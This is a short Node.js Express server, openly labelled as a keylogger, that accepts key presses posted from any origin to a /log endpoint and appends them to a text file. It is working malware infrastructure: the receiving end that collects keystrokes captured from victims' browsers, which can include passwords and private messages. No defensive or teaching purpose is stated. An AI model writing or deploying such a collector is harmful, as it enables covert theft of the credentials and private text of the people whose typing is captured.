const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();

app.use(express.json());
app.use(cors());  // ✅ Allows frontend requests from different origins

app.post("/log", (req, res) => {
    const { key } = req.body;
    console.log(`Logged key: ${key}`);

    fs.appendFileSync("log.txt", key + " "); // Append key presses to the file
    res.sendStatus(200);
});

app.listen(3000, () => console.log("Keylogger running on http://localhost:3000"));
